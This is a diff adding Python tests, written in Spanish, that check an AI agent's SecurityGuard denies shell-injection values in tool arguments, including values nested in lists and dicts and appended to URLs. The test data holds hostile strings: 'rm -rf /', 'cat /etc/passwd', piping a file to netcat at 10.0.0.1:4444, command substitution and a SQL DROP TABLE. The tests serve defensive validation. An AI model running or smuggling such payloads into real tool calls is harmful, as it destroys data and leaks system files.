@@ -118,6 +118,97 @@ class TestSecurityGuardInjectionAndTraversal:
         assert eval_res.decision == PolicyDecision.DENY
         assert "protegida" in eval_res.reason.lower()
 
+    def test_blocks_shell_injection_on_unrestricted_argument_names(self) -> None:
+        """Verifica que argumentos con nombres arbitrarios (target, input, script, cmd, etc.)
+        ya no esquivan la validación de inyección shell [AGENTE-SEC-02]."""
+        audit = SecurityAuditLogger(auto_persist=False)
+        guard = SecurityGuard(audit_logger=audit)
+
+        tool = AgentTool(
+            name="custom_executor",
+            description="Custom execution tool",
+            category="system",
+            args_schema=DummyArgs,
+            func=mock_tool_func,
+            risk_level=RiskLevel.LOW,
+        )
+
+        unrestricted_keys_payloads = [
+            ("target", "localhost && id"),
+            ("input", "data | cat /etc/passwd"),
+            ("script", "run.sh; rm -rf /"),
+            ("query", "SELECT * FROM users; DROP TABLE--"),
+            ("cmd", "sleep 5 &"),
+            ("args", "`whoami`"),
+            ("path", "file.txt | nc 10.0.0.1 4444"),
+            ("container", "app$(id)"),
+        ]
+
+        for key, payload in unrestricted_keys_payloads:
+            eval_res = guard.evaluate(tool=tool, tool_args={key: payload})
+            assert eval_res.decision == PolicyDecision.DENY, (
+                f"Fallo de seguridad [AGENTE-SEC-02]: El argumento '{key}' con valor '{payload}' "
+                f"no fue bloqueado por el filtro de inyección shell."
+            )
+            assert "inyección" in eval_res.reason.lower()
+
+    def test_blocks_nested_shell_injection(self) -> None:
+        """Verifica que inyecciones dentro de estructuras anidadas (dicts, listas) sean detectadas."""
+        audit = SecurityAuditLogger(auto_persist=False)
+        guard = SecurityGuard(audit_logger=audit)
+
+        tool = AgentTool(
+            name="complex_runner",
+            description="Complex runner tool",
+            category="system",
+            args_schema=DummyArgs,
+            func=mock_tool_func,
+            risk_level=RiskLevel.LOW,
+        )
+
+        # En lista
+        eval_list = guard.evaluate(tool=tool, tool_args={"options": ["--flag", "param; id"]})
+        assert eval_list.decision == PolicyDecision.DENY
+        assert "inyección" in eval_list.reason.lower()
+
+        # En diccionario anidado
+        eval_dict = guard.evaluate(
+            tool=tool, tool_args={"config": {"extra": {"target": "host | evil"}}}
+        )
+        assert eval_dict.decision == PolicyDecision.DENY
+        assert "inyección" in eval_dict.reason.lower()
+
+    def test_allows_safe_url_query_strings_but_blocks_url_shell_injection(self) -> None:
+        """Verifica que URLs con query strings ('&') sean permitidas pero delimitadores shell sean bloqueados."""
+        audit = SecurityAuditLogger(auto_persist=False)
+        guard = SecurityGuard(audit_logger=audit)
+
+        tool = AgentTool(
+            name="api_fetcher",
+            description="Fetch API data",
+            category="network",
+            args_schema=DummyArgs,
+            func=mock_tool_func,
+            risk_level=RiskLevel.LOW,
+        )
+
+        # URL válida con query string ('&' no debe ser bloqueado en URLs)
+        eval_ok = guard.evaluate(
+            tool=tool,
+            tool_args={
+                "endpoint": "https://api.cabocom.net/weather?city=Madrid&lang=es&units=metric"
+            },
+        )
+        assert eval_ok.decision == PolicyDecision.ALLOW
+
+        # URL con delimitador shell peligroso (';', '`', '$') debe ser bloqueado
+        eval_bad = guard.evaluate(
+            tool=tool,
+            tool_args={"endpoint": "https://api.cabocom.net/weather; rm -rf /"},
+        )
+        assert eval_bad.decision == PolicyDecision.DENY
+        assert "inyección" in eval_bad.reason.lower()
+
 
 class TestSecurityGuardSSRF:
     """Pruebas de integración de reglas SSRF en SecurityGuard."""
